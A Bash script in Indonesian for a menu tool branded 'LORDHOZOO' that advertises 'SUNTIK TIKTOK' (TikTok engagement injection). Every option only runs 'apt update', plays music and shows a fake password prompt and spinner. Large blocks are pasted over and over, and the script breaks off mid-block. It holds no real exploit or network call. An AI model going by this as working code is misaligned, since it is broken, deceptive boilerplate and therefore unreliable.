echo -e "║ ${YELLOW}[07]${NC}.  SUNTIK TIKTOK                  ${GREEN}║"
echo -e "║ ${YELLOW}[08]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[09]${NC}. MENU  SUNTIK TIKTOK             ${GREEN}║"
echo -e "║ ${YELLOW}[10]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[11]${NC}. LAPOR BUG                       ${GREEN}║"
echo -e "║ ${YELLOW}[12]${NC}. YOUUTUBE : LORDHOZOO            ${GREEN}║"
echo -e "║ ${YELLOW}[13]${NC}. TIKTOK   : LORDHOZOO            ${GREEN}║"
echo -e "║ ${YELLOW}[14]${NC}. ABOUT ME                        ${GREEN}║"
echo -e "║ ${YELLOW}[15]${NC}. Exit                            ${GREEN}║"
echo -e "╚═══════════════════════════════════════╝${NC}"
echo -e "${PURPLE} ╭─ROOT@LORDHOZOO@localhost /home"


read -p "$(echo -e ${PURPLE}" ╰─$: "${NC})" updt

# data
if [ "$updt" -eq 1 ] || [ "$updt" -eq 01 ]; then
    # Add your code here for option 1
    apt update
    #!/bin/bash


fi

if [ "$updt" -eq 2 ] || [ "$updt" -eq 02 ]; then
    # Add your code here for option 2
    apt update
fi

if [ "$updt" -eq 3 ] || [ "$updt" -eq 03 ]; then
    # Add your code here for option 3
    apt update
fi

if [ "$updt" -eq 4 ] || [ "$updt" -eq 04 ]; then
    # Add your code here for option 4
    apt update
fi

if [ "$updt" -eq 5 ] || [ "$updt" -eq 05 ]; then
    # Add your code here for option 5
    apt update
fi

if [ "$updt" -eq 6 ] || [ "$updt" -eq 06 ]; then
    # Add your code here for option 6
    apt update
fi

if [ "$updt" -eq 7 ] || [ "$updt" -eq 07 ]; then
    # Add your code here for option 7
    apt update
fi

if [ "$updt" -eq 8 ] || [ "$updt" -eq 08 ]; then
    # Add your code here for option 8
    apt update
fi

if [ "$updt" -eq 9 ] || [ "$updt" -eq 09 ]; then
    # Add your code here for option 9
    apt update
fi

if [ "$updt" -eq 10 ]; then
    # Add your code here for option 10
    apt  update
fi

if [ "$updt" -eq 11 ]; then
    # Add your code here for option 11
    apt update
fi

if [ "$updt" -eq 12 ]; then
    # Add your code here for option 12
    apt  update
fi

if [ "$updt" -eq 13 ]; then
    # Add your code here for option 13
    apt update
fi

if [ "$updt" -eq 14 ]; then
    # Add your code here for option 14
    apt  update
fi

if [ "$updt" -eq 15 ]; then
    # Add your code here for option 15
    apt update
fi

if [ "$updt" -eq 16 ]; then
    # Add your code here for option 16
    apt update -y
    RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'
blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'
yellow='\033[33;1m'
blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'
yellow='\033[33;1m'
clear
apt install mpv -y
clear
apt install mpv -y
clear
mpv --no-video --volume=80 PHONK.mp3 &>/dev/null & disown
function loading_animation() {
    local pid=$1
    local delay=1
    local spinstr='|/-\'
    
    echo -n "Memproses "
    while [ "$(ps a | awk '{print $1}' | grep $pid)" ]; do
        local temp=${spinstr#?}
        printf " [%c]  " "$spinstr"
        local spinstr=$temp${spinstr%"$temp"}
        sleep $delay
        printf "\b\b\b\b\b\b"
    done
    printf "    \b\b\b\b"
}

# Meminta password
echo -e " \033[31;1m █░░ █▀█ █▀█ █▀▄ █░█ █▀█ ▀█ █▀█ █▀█"
echo -e " \033[37;1m █▄▄ █▄█ █▀▄ █▄▀ █▀█ █▄█ █▄ █▄█ █▄█ \033[31;1m V 1.0.1 "
echo -e "\033[37;1m┌──────────────────────────────────────────────────────────────┐ $white"
echo -e "│ $white AUTHOR   : LORDHOZOO                                        │"
echo -e "│ $white DILIRIS  : 2025-10-10 MEI SABTU                             │"
echo -e "│ $white YOUTUBE  : LORDHOZOO                                        │"
echo -e "│ $white TIKTOK   : LORDHOZOO                                        │" 
echo -e "│ $white STATUS   : $green ONLINE                                       $white   │ $white "
echo -e "└──────────────────────────────────────────────────────────────┘ $white"
echo -e "Masukkan Password untuk menjalankan tools: "
read -s password
echo

# Cek password (contoh password "rahasia")
if [ "$password" != "" ]; then
    echo "Password salah! Tools tidak dijalankan."
    exit 1
fi

# Proses yang membutuhkan loading
(
    # Simulasi proses yang memakan waktu
    sleep 3
) &

loading_animation $!

echo -e "\nTools berhasil dijalankan! 👰 Sukses"
clear
RED='\033[1;31m'
GREEN='\033[1;32m'
YELLOW='\033[1;33m'
BLUE='\033[1;34m'
PURPLE='\033[1;35m'
CYAN='\033[1;36m'
WHITE='\033[1;37m'
NC='\033[0m'

# Animation function
animate() {
    local text="$1"
    for ((i=0; i<${#text}; i++)); do
        echo -n "${text:$i:1}"
         done
    echo
}

echo -e " \033[31;1m █░░ █▀█ █▀█ █▀▄ █░█ █▀█ ▀█ █▀█ █▀█"
echo -e " \033[37;1m █▄▄ █▄█ █▀▄ █▄▀ █▀█ █▄█ █▄ █▄█ █▄█ \033[31;1m V 1.0.1 "
echo -e "\033[37;1m┌──────────────────────────────────────────────────────────────┐ $white"
echo -e "│ $white AUTHOR   : LORDHOZOO                                        │"
echo -e "│ $white DILIRIS  : 2025-10-10 MEI SABTU                             │"
echo -e "│ $white YOUTUBE  : LORDHOZOO                                        │"
echo -e "│ $white TIKTOK   : LORDHOZOO                                        │"
echo -e "│ $white STATUS   : $green ONLINE                                       $white   │ $white "
echo -e "└──────────────────────────────────────────────────────────────┘ $white"
# Menu options
echo -e "${GREEN}╔═══════════════════════════════════════╗"      
echo -e "║          👸  LORDHOZOO 👸             ${GREEN}║"
echo -e "╠═══════════════════════════════════════╣"
echo -e "║ ${YELLOW}[01]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[02]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[03]${NC}. SUNTIK TIKTOK                   ${GREEN}║"
echo -e "║ ${YELLOW}[04]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[05]${NC}. MENU  SUNTIK TIKTOK             ${GREEN}║"
echo -e "║ ${YELLOW}[06]${NC}.  SUNTIK TIKTOK                  ${GREEN}║"
echo -e "║ ${YELLOW}[07]${NC}.  SUNTIK TIKTOK                  ${GREEN}║"
echo -e "║ ${YELLOW}[08]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[09]${NC}. MENU  SUNTIK TIKTOK             ${GREEN}║"
echo -e "║ ${YELLOW}[10]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[11]${NC}. LAPOR BUG                       ${GREEN}║"
echo -e "║ ${YELLOW}[12]${NC}. YOUUTUBE : LORDHOZOO            ${GREEN}║"
echo -e "║ ${YELLOW}[13]${NC}. TIKTOK   : LORDHOZOO            ${GREEN}║"
echo -e "║ ${YELLOW}[14]${NC}. ABOUT ME                        ${GREEN}║"
echo -e "║ ${YELLOW}[15]${NC}. Exit                            ${GREEN}║"
echo -e "╚═══════════════════════════════════════╝${NC}"
echo -e "${PURPLE} ╭─ROOT@LORDHOZOO@localhost /home"


read -p "$(echo -e ${PURPLE}" ╰─$: "${NC})" updt

# data
if [ "$updt" -eq 1 ] || [ "$updt" -eq 01 ]; then
    # Add your code here for option 1
    apt update
    #!/bin/bash


fi

if [ "$updt" -eq 2 ] || [ "$updt" -eq 02 ]; then
    # Add your code here for option 2
    apt update
fi

if [ "$updt" -eq 3 ] || [ "$updt" -eq 03 ]; then
    # Add your code here for option 3
    apt update
fi

if [ "$updt" -eq 4 ] || [ "$updt" -eq 04 ]; then
    # Add your code here for option 4
    apt update
fi

if [ "$updt" -eq 5 ] || [ "$updt" -eq 05 ]; then
    # Add your code here for option 5
    apt update
fi

if [ "$updt" -eq 6 ] || [ "$updt" -eq 06 ]; then
    # Add your code here for option 6
    apt update
fi

if [ "$updt" -eq 7 ] || [ "$updt" -eq 07 ]; then
    # Add your code here for option 7
    apt update
fi

if [ "$updt" -eq 8 ] || [ "$updt" -eq 08 ]; then
    # Add your code here for option 8
    apt update
fi

if [ "$updt" -eq 9 ] || [ "$updt" -eq 09 ]; then
    # Add your code here for option 9
    apt update
fi

if [ "$updt" -eq 10 ]; then
    # Add your code here for option 10
    apt update
fi

if [ "$updt" -eq 11 ]; then
    # Add your code here for option 11
    apt update
fi

if [ "$updt" -eq 12 ]; then
    # Add your code here for option 12
    apt update
fi

if [ "$updt" -eq 13 ]; then
    # Add your code here for option 13
    apt update
fi

if [ "$updt" -eq 14 ]; then
    # Add your code here for option 14
    apt update
fi

if [ "$updt" -eq 15 ]; then
    # Add your code here for option 15
    apt update
fi



if [ "$updt" -eq 17 ]; then
    # Add your code here for option 17
    apt update -y
    clear
    RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'
blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'
yellow='\033[33;1m'
blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'
yellow='\033[33;1m'
clear
pkg install mpv -y
clear
apt install mpv -y
clear
mpv --no-video --volume=80 PHONK.mp3 &>/dev/null & disown
function loading_animation() {
    local pid=$1
    local delay=1
    local spinstr='|/-\'
    
    echo -n "Memproses "
    while [ "$(ps a | awk '{print $1}' | grep $pid)" ]; do
        local temp=${spinstr#?}
        printf " [%c]  " "$spinstr"
        local spinstr=$temp${spinstr%"$temp"}
        sleep $delay
        printf "\b\b\b\b\b\b"
    done
    printf "    \b\b\b\b"
}

# Meminta password
echo -e " \033[31;1m █░░ █▀█ █▀█ █▀▄ █░█ █▀█ ▀█ █▀█ █▀█"
echo -e " \033[37;1m █▄▄ █▄█ █▀▄ █▄▀ █▀█ █▄█ █▄ █▄█ █▄█ \033[31;1m V 1.0.1 "
echo -e "\033[37;1m┌──────────────────────────────────────────────────────────────┐ $white"
echo -e "│ $white AUTHOR   : LORDHOZOO                                        │"
echo -e "│ $white DILIRIS  : 2025-10-10 MEI SABTU                             │"
echo -e "│ $white YOUTUBE  : LORDHOZOO                                        │"
echo -e "│ $white TIKTOK   : LORDHOZOO                                        │" 
echo -e "│ $white STATUS   : $green ONLINE                                       $white   │ $white "
echo -e "└──────────────────────────────────────────────────────────────┘ $white"
echo -e "Masukkan Password untuk menjalankan tools: "
read -s password
echo

# Cek password (contoh password "rahasia")
if [ "$password" != "" ]; then
    echo "Password salah! Tools tidak dijalankan."
    exit 1
fi

# Proses yang membutuhkan loading
(
    # Simulasi proses yang memakan waktu
    sleep 3
) &

loading_animation $!

echo -e "\nTools berhasil dijalankan! 👰 Sukses"
clear
RED='\033[1;31m'
GREEN='\033[1;32m'
YELLOW='\033[1;33m'
BLUE='\033[1;34m'
PURPLE='\033[1;35m'
CYAN='\033[1;36m'
WHITE='\033[1;37m'
NC='\033[0m'

# Animation function
animate() {
    local text="$1"
    for ((i=0; i<${#text}; i++)); do
        echo -n "${text:$i:1}"
         done
    echo
}

echo -e " \033[31;1m █░░ █▀█ █▀█ █▀▄ █░█ █▀█ ▀█ █▀█ █▀█"
echo -e " \033[37;1m █▄▄ █▄█ █▀▄ █▄▀ █▀█ █▄█ █▄ █▄█ █▄█ \033[31;1m V 1.0.1 "
echo -e "\033[37;1m┌──────────────────────────────────────────────────────────────┐ $white"
echo -e "│ $white AUTHOR   : LORDHOZOO                                        │"
echo -e "│ $white DILIRIS  : 2025-10-10 MEI SABTU                             │"
echo -e "│ $white YOUTUBE  : LORDHOZOO                                        │"
echo -e "│ $white TIKTOK   : LORDHOZOO                                        │"
echo -e "│ $white STATUS   : $green ONLINE                                       $white   │ $white "
echo -e "└──────────────────────────────────────────────────────────────┘ $white"
# Menu options
echo -e "${GREEN}╔═══════════════════════════════════════╗"      
echo -e "║          👸  LORDHOZOO 👸             ${GREEN}║"
echo -e "╠═══════════════════════════════════════╣"
echo -e "║ ${YELLOW}[01]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[02]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[03]${NC}. SUNTIK TIKTOK                   ${GREEN}║"
echo -e "║ ${YELLOW}[04]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[05]${NC}. MENU  SUNTIK TIKTOK             ${GREEN}║"
echo -e "║ ${YELLOW}[06]${NC}.  SUNTIK TIKTOK                  ${GREEN}║"
echo -e "║ ${YELLOW}[07]${NC}.  SUNTIK TIKTOK                  ${GREEN}║"
echo -e "║ ${YELLOW}[08]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[09]${NC}. MENU  SUNTIK TIKTOK             ${GREEN}║"
echo -e "║ ${YELLOW}[10]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[11]${NC}. LAPOR BUG                       ${GREEN}║"
echo -e "║ ${YELLOW}[12]${NC}. YOUUTUBE : LORDHOZOO            ${GREEN}║"
echo -e "║ ${YELLOW}[13]${NC}. TIKTOK   : LORDHOZOO            ${GREEN}║"
echo -e "║ ${YELLOW}[14]${NC}. ABOUT ME                        ${GREEN}║"
echo -e "║ ${YELLOW}[15]${NC}. Exit                            ${GREEN}║"
echo -e "╚═══════════════════════════════════════╝${NC}"
echo -e "${PURPLE} ╭─ROOT@LORDHOZOO@localhost /home"


read -p "$(echo -e ${PURPLE}" ╰─$: "${NC})" updt

# data
if [ "$updt" -eq 1 ] || [ "$updt" -eq 01 ]; then
    # Add your code here for option 1
    apt update
    #!/bin/bash


fi

if [ "$updt" -eq 2 ] || [ "$updt" -eq 02 ]; then
    # Add your code here for option 2
    apt update
fi

if [ "$updt" -eq 3 ] || [ "$updt" -eq 03 ]; then
    # Add your code here for option 3
    apt update
fi

if [ "$updt" -eq 4 ] || [ "$updt" -eq 04 ]; then
    # Add your code here for option 4
    apt update
fi

if [ "$updt" -eq 5 ] || [ "$updt" -eq 05 ]; then
    # Add your code here for option 5
    apt update
fi

if [ "$updt" -eq 6 ] || [ "$updt" -eq 06 ]; then
    # Add your code here for option 6
    apt update
fi

if [ "$updt" -eq 7 ] || [ "$updt" -eq 07 ]; then
    # Add your code here for option 7
    apt update
fi

if [ "$updt" -eq 8 ] || [ "$updt" -eq 08 ]; then
    # Add your code here for option 8
  apt  update
fi

if [ "$updt" -eq 9 ] || [ "$updt" -eq 09 ]; then
    # Add your code here for option 9
    apt update
fi

if [ "$updt" -eq 10 ]; then
    # Add your code here for option 10
    apt update
fi

if [ "$updt" -eq 11 ]; then
    # Add your code here for option 11
    apt update
fi

if [ "$updt" -eq 12 ]; then
    # Add your code here for option 12
    apt update
fi

if [ "$updt" -eq 13 ]; then
    # Add your code here for option 13
    apt update
fi

if [ "$updt" -eq 14 ]; then
    # Add your code here for option 14
    apt update
fi

if [ "$updt" -eq 15 ]; then
    # Add your code here for option 15
    apt update
fi


if [ "$updt" -eq 18 ]; then
    # Add your code here for option 18
    apt  update
    RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'
blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'
yellow='\033[33;1m'
blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'
yellow='\033[33;1m'
clear
pkg install mpv -y
clear
apt install mpv -y
clear
mpv --no-video --volume=80 PHONK.mp3 &>/dev/null & disown
function loading_animation() {
    local pid=$1
    local delay=1
    local spinstr='|/-\'
    
    echo -n "Memproses "
    while [ "$(ps a | awk '{print $1}' | grep $pid)" ]; do
        local temp=${spinstr#?}
        printf " [%c]  " "$spinstr"
        local spinstr=$temp${spinstr%"$temp"}
        sleep $delay
        printf "\b\b\b\b\b\b"
    done
    printf "    \b\b\b\b"
}

# Meminta password
echo -e " \033[31;1m █░░ █▀█ █▀█ █▀▄ █░█ █▀█ ▀█ █▀█ █▀█"
echo -e " \033[37;1m █▄▄ █▄█ █▀▄ █▄▀ █▀█ █▄█ █▄ █▄█ █▄█ \033[31;1m V 1.0.1 "
echo -e "\033[37;1m┌──────────────────────────────────────────────────────────────┐ $white"
echo -e "│ $white AUTHOR   : LORDHOZOO                                        │"
echo -e "│ $white DILIRIS  : 2025-10-10 MEI SABTU                             │"
echo -e "│ $white YOUTUBE  : LORDHOZOO                                        │"
echo -e "│ $white TIKTOK   : LORDHOZOO                                        │" 
echo -e "│ $white STATUS   : $green ONLINE                                       $white   │ $white "
echo -e "└──────────────────────────────────────────────────────────────┘ $white"
echo -e "Masukkan Password untuk menjalankan tools: "
read -s password
echo

# Cek password (contoh password "rahasia")
if [ "$password" != "" ]; then
    echo "Password salah! Tools tidak dijalankan."
    exit 1
fi

# Proses yang membutuhkan loading
(
    # Simulasi proses yang memakan waktu
    sleep 3
) &

loading_animation $!

echo -e "\nTools berhasil dijalankan! 👰 Sukses"
clear
RED='\033[1;31m'
GREEN='\033[1;32m'
YELLOW='\033[1;33m'
BLUE='\033[1;34m'
PURPLE='\033[1;35m'
CYAN='\033[1;36m'
WHITE='\033[1;37m'
NC='\033[0m'

# Animation function
animate() {
    local text="$1"
    for ((i=0; i<${#text}; i++)); do
        echo -n "${text:$i:1}"
         done
    echo
}

echo -e " \033[31;1m █░░ █▀█ █▀█ █▀▄ █░█ █▀█ ▀█ █▀█ █▀█"
echo -e " \033[37;1m █▄▄ █▄█ █▀▄ █▄▀ █▀█ █▄█ █▄ █▄█ █▄█ \033[31;1m V 1.0.1 "
echo -e "\033[37;1m┌──────────────────────────────────────────────────────────────┐ $white"
echo -e "│ $white AUTHOR   : LORDHOZOO                                        │"
echo -e "│ $white DILIRIS  : 2025-10-10 MEI SABTU                             │"
echo -e "│ $white YOUTUBE  : LORDHOZOO                                        │"
echo -e "│ $white TIKTOK   : LORDHOZOO                                        │"
echo -e "│ $white STATUS   : $green ONLINE                                       $white   │ $white "
echo -e "└──────────────────────────────────────────────────────────────┘ $white"
# Menu options
echo -e "${GREEN}╔═══════════════════════════════════════╗"      
echo -e "║          👸  LORDHOZOO 👸             ${GREEN}║"
echo -e "╠═══════════════════════════════════════╣"
echo -e "║ ${YELLOW}[01]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[02]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[03]${NC}. SUNTIK TIKTOK                   ${GREEN}║"
echo -e "║ ${YELLOW}[04]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[05]${NC}. MENU  SUNTIK TIKTOK             ${GREEN}║"
echo -e "║ ${YELLOW}[06]${NC}.  SUNTIK TIKTOK                  ${GREEN}║"
echo -e "║ ${YELLOW}[07]${NC}.  SUNTIK TIKTOK                  ${GREEN}║"
echo -e "║ ${YELLOW}[08]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[09]${NC}. MENU  SUNTIK TIKTOK             ${GREEN}║"
echo -e "║ ${YELLOW}[10]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[11]${NC}. LAPOR BUG                       ${GREEN}║"
echo -e "║ ${YELLOW}[12]${NC}. YOUUTUBE : LORDHOZOO            ${GREEN}║"
echo -e "║ ${YELLOW}[13]${NC}. TIKTOK   : LORDHOZOO            ${GREEN}║"
echo -e "║ ${YELLOW}[14]${NC}. ABOUT ME                        ${GREEN}║"
echo -e "║ ${YELLOW}[15]${NC}. Exit                            ${GREEN}║"
echo -e "╚═══════════════════════════════════════╝${NC}"
echo -e "${PURPLE} ╭─ROOT@LORDHOZOO@localhost /home"


read -p "$(echo -e ${PURPLE}" ╰─$: "${NC})" updt

# data
if [ "$updt" -eq 1 ] || [ "$updt" -eq 01 ]; then
    # Add your code here for option 1
    apt update
    #!/bin/bash


fi

if [ "$updt" -eq 2 ] || [ "$updt" -eq 02 ]; then
    # Add your code here for option 2
    apt  update
fi

if [ "$updt" -eq 3 ] || [ "$updt" -eq 03 ]; then
    # Add your code here for option 3
    apt update
fi

if [ "$updt" -eq 4 ] || [ "$updt" -eq 04 ]; then
    # Add your code here for option 4
    apt update
fi

if [ "$updt" -eq 5 ] || [ "$updt" -eq 05 ]; then
    # Add your code here for option 5
    apt update
fi

if [ "$updt" -eq 6 ] || [ "$updt" -eq 06 ]; then
    # Add your code here for option 6
    apt update
fi

if [ "$updt" -eq 7 ] || [ "$updt" -eq 07 ]; then
    # Add your code here for option 7
    apt update
fi

if [ "$updt" -eq 8 ] || [ "$updt" -eq 08 ]; then
    # Add your code here for option 8
    apt  update
fi

if [ "$updt" -eq 9 ] || [ "$updt" -eq 09 ]; then
    # Add your code here for option 9
    apt update
fi

if [ "$updt" -eq 10 ]; then
    # Add your code here for option 10
    apt update
fi

if [ "$updt" -eq 11 ]; then
    # Add your code here for option 11
    apt update
fi

if [ "$updt" -eq 12 ]; then
    # Add your code here for option 12
    apt update
fi

if [ "$updt" -eq 13 ]; then
    # Add your code here for option 13
    apt update
fi

if [ "$updt" -eq 14 ]; then
    # Add your code here for option 14
    apt update
fi

if [ "$updt" -eq 15 ]; then
    # Add your code here for option 15
    apt update
fi


if [ "$updt" -eq 19 ]; then
    # Add your code here for option 19
    apt  update -y 
    RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'
blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'
yellow='\033[33;1m'
blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'
yellow='\033[33;1m'
clear
apt install mpv -y
clear
apt install mpv -y
clear
mpv --no-video --volume=80 PHONK.mp3 &>/dev/null & disown
function loading_animation() {
    local pid=$1
    local delay=1
    local spinstr='|/-\'
    
    echo -n "Memproses "
    while [ "$(ps a | awk '{print $1}' | grep $pid)" ]; do
        local temp=${spinstr#?}
        printf " [%c]  " "$spinstr"
        local spinstr=$temp${spinstr%"$temp"}
        sleep $delay
        printf "\b\b\b\b\b\b"
    done
    printf "    \b\b\b\b"
}

# Meminta password
echo -e " \033[31;1m █░░ █▀█ █▀█ █▀▄ █░█ █▀█ ▀█ █▀█ █▀█"
echo -e " \033[37;1m █▄▄ █▄█ █▀▄ █▄▀ █▀█ █▄█ █▄ █▄█ █▄█ \033[31;1m V 1.0.1 "
echo -e "\033[37;1m┌──────────────────────────────────────────────────────────────┐ $white"
echo -e "│ $white AUTHOR   : LORDHOZOO                                        │"
echo -e "│ $white DILIRIS  : 2025-10-10 MEI SABTU                             │"
echo -e "│ $white YOUTUBE  : LORDHOZOO                                        │"
echo -e "│ $white TIKTOK   : LORDHOZOO                                        │" 
echo -e "│ $white STATUS   : $green ONLINE                                       $white   │ $white "
echo -e "└──────────────────────────────────────────────────────────────┘ $white"
echo -e "Masukkan Password untuk menjalankan tools: "
read -s password
echo

# Cek password (contoh password "rahasia")
if [ "$password" != "" ]; then
    echo "Password salah! Tools tidak dijalankan."
    exit 1
fi

# Proses yang membutuhkan loading
(
    # Simulasi proses yang memakan waktu
    sleep 3
) &

loading_animation $!

echo -e "\nTools berhasil dijalankan! 👰 Sukses"
clear
RED='\033[1;31m'
GREEN='\033[1;32m'
YELLOW='\033[1;33m'
BLUE='\033[1;34m'
PURPLE='\033[1;35m'
CYAN='\033[1;36m'
WHITE='\033[1;37m'
NC='\033[0m'

# Animation function
animate() {
    local text="$1"
    for ((i=0; i<${#text}; i++)); do
        echo -n "${text:$i:1}"
         done
    echo
}

echo -e " \033[31;1m █░░ █▀█ █▀█ █▀▄ █░█ █▀█ ▀█ █▀█ █▀█"
echo -e " \033[37;1m █▄▄ █▄█ █▀▄ █▄▀ █▀█ █▄█ █▄ █▄█ █▄█ \033[31;1m V 1.0.1 "
echo -e "\033[37;1m┌──────────────────────────────────────────────────────────────┐ $white"
echo -e "│ $white AUTHOR   : LORDHOZOO                                        │"
echo -e "│ $white DILIRIS  : 2025-10-10 MEI SABTU                             │"
echo -e "│ $white YOUTUBE  : LORDHOZOO                                        │"
echo -e "│ $white TIKTOK   : LORDHOZOO                                        │"
echo -e "│ $white STATUS   : $green ONLINE                                       $white   │ $white "
echo -e "└──────────────────────────────────────────────────────────────┘ $white"
# Menu options
echo -e "${GREEN}╔═══════════════════════════════════════╗"      
echo -e "║          👸  LORDHOZOO 👸             ${GREEN}║"
echo -e "╠═══════════════════════════════════════╣"
echo -e "║ ${YELLOW}[01]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[02]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[03]${NC}. SUNTIK TIKTOK                   ${GREEN}║"
echo -e "║ ${YELLOW}[04]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[05]${NC}. MENU  SUNTIK TIKTOK             ${GREEN}║"
echo -e "║ ${YELLOW}[06]${NC}.  SUNTIK TIKTOK                  ${GREEN}║"
echo -e "║ ${YELLOW}[07]${NC}.  SUNTIK TIKTOK                  ${GREEN}║"
echo -e "║ ${YELLOW}[08]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[09]${NC}. MENU  SUNTIK TIKTOK             ${GREEN}║"
echo -e "║ ${YELLOW}[10]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[11]${NC}. LAPOR BUG                       ${GREEN}║"
echo -e "║ ${YELLOW}[12]${NC}. YOUUTUBE : LORDHOZOO            ${GREEN}║"
echo -e "║ ${YELLOW}[13]${NC}. TIKTOK   : LORDHOZOO            ${GREEN}║"
echo -e "║ ${YELLOW}[14]${NC}. ABOUT ME                        ${GREEN}║"
echo -e "║ ${YELLOW}[15]${NC}. Exit                            ${GREEN}║"
echo -e "╚═══════════════════════════════════════╝${NC}"
echo -e "${PURPLE} ╭─ROOT@LORDHOZOO@localhost /home"


read -p "$(echo -e ${PURPLE}" ╰─$: "${NC})" updt

# data
if [ "$updt" -eq 1 ] || [ "$updt" -eq 01 ]; then
    # Add your code here for option 1
    apt update
    #!/bin/bash


fi

if [ "$updt" -eq 2 ] || [ "$updt" -eq 02 ]; then
    # Add your code here for option 2
    apt update
fi

if [ "$updt" -eq 3 ] || [ "$updt" -eq 03 ]; then
    # Add your code here for option 3
    apt update
fi

if [ "$updt" -eq 4 ] || [ "$updt" -eq 04 ]; then
    # Add your code here for option 4
    apt update
fi

if [ "$updt" -eq 5 ] || [ "$updt" -eq 05 ]; then
    # Add your code here for option 5
    apt update
fi

if [ "$updt" -eq 6 ] || [ "$updt" -eq 06 ]; then
    # Add your code here for option 6
    apt update
fi

if [ "$updt" -eq 7 ] || [ "$updt" -eq 07 ]; then
    # Add your code here for option 7
    apt update
fi

if [ "$updt" -eq 8 ] || [ "$updt" -eq 08 ]; then
    # Add your code here for option 8
    apt update
fi

if [ "$updt" -eq 9 ] || [ "$updt" -eq 09 ]; then
    # Add your code here for option 9
    apt update
fi

if [ "$updt" -eq 10 ]; then
    # Add your code here for option 10
    apt  update
fi

if [ "$updt" -eq 11 ]; then
    # Add your code here for option 11
    apt update
fi

if [ "$updt" -eq 12 ]; then
    # Add your code here for option 12
    apt update
fi

if [ "$updt" -eq 13 ]; then
    # Add your code here for option 13
    apt update
fi

if [ "$updt" -eq 14 ]; then
    # Add your code here for option 14
    apt update
fi

if [ "$updt" -eq 15 ]; then
    # Add your code here for option 15
    apt update -y
fi



if [ "$updt" -eq 20 ]; then
    # Add your code here for option 20
    apt update -y
    RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'
blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'
yellow='\033[33;1m'
blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'
yellow='\033[33;1m'
clear
pkg install mpv -y
clear
apt install mpv -y
clear
mpv --no-video --volume=80 PHONK.mp3 &>/dev/null & disown
function loading_animation() {
    local pid=$1
    local delay=1
    local spinstr='|/-\'
    
    echo -n "Memproses "
    while [ "$(ps a | awk '{print $1}' | grep $pid)" ]; do
        local temp=${spinstr#?}
        printf " [%c]  " "$spinstr"
        local spinstr=$temp${spinstr%"$temp"}
        sleep $delay
        printf "\b\b\b\b\b\b"
    done
    printf "    \b\b\b\b"
}

# Meminta password
echo -e " \033[31;1m █░░ █▀█ █▀█ █▀▄ █░█ █▀█ ▀█ █▀█ █▀█"
echo -e " \033[37;1m █▄▄ █▄█ █▀▄ █▄▀ █▀█ █▄█ █▄ █▄█ █▄█ \033[31;1m V 1.0.1 "
echo -e "\033[37;1m┌──────────────────────────────────────────────────────────────┐ $white"
echo -e "│ $white AUTHOR   : LORDHOZOO                                        │"
echo -e "│ $white DILIRIS  : 2025-10-10 MEI SABTU                             │"
echo -e "│ $white YOUTUBE  : LORDHOZOO                                        │"
